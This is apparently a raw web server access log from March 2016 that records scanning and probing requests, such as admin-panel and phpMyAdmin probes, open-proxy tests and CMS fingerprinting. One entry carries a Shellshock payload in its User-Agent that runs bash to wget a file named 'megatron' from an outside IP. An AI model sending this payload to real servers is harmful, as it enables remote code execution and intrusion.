5.39.222.159 - - [21/Mar/2016:12:04:07 +0800] "GET /rom-0 HTTP/1.1" 404 441 "-" "Mozilla/5.0 zgrab/0.x"
218.55.21.53 - - [21/Mar/2016:17:36:24 +0800] "GET /manager/html HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
185.25.148.240 - - [21/Mar/2016:21:50:53 +0800] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
85.131.207.5 - - [22/Mar/2016:12:03:47 +0800] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 517 "-" "-"
79.172.193.32 - - [22/Mar/2016:12:43:08 +0800] "GET / HTTP/1.1" 200 11783 "-" "() { :; }; /bin/bash -c 'wget http://176.126.85.127:8080/megatron -O /dev/null'"
192.237.180.8 - - [22/Mar/2016:07:09:59 +0000] "GET / HTTP/1.0" 200 11783 "-" "-"
192.237.180.8 - - [22/Mar/2016:15:10:03 +0800] "GET / HTTP/1.1" 200 3557 "-" "Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0"
192.237.180.8 - - [22/Mar/2016:15:10:07 +0800] "GET /CHANGELOG.txt HTTP/1.1" 404 468 "-" "Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0"
192.237.180.8 - - [22/Mar/2016:15:10:16 +0800] "GET / HTTP/1.1" 200 3557 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36"
192.237.180.8 - - [22/Mar/2016:15:10:21 +0800] "GET /readme.html HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36"
185.25.148.240 - - [22/Mar/2016:17:38:53 +0800] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 458 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
136.145.86.72 - - [22/Mar/2016:22:01:48 +0800] "GET / HTTP/1.0" 200 11783 "-" "-"
136.145.86.72 - - [22/Mar/2016:22:01:55 +0800] "GET / HTTP/1.1" 200 3557 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
136.145.86.72 - - [22/Mar/2016:22:02:02 +0800] "GET /CHANGELOG.txt HTTP/1.1" 404 468 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0"
136.145.86.72 - - [22/Mar/2016:22:02:09 +0800] "GET / HTTP/1.1" 200 3557 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
136.145.86.72 - - [22/Mar/2016:22:02:17 +0800] "GET /readme.html HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
23.253.36.230 - - [23/Mar/2016:04:02:44 +0800] "GET / HTTP/1.0" 200 11783 "-" "-"
23.253.36.230 - - [23/Mar/2016:04:02:54 +0800] "GET / HTTP/1.1" 200 3557 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
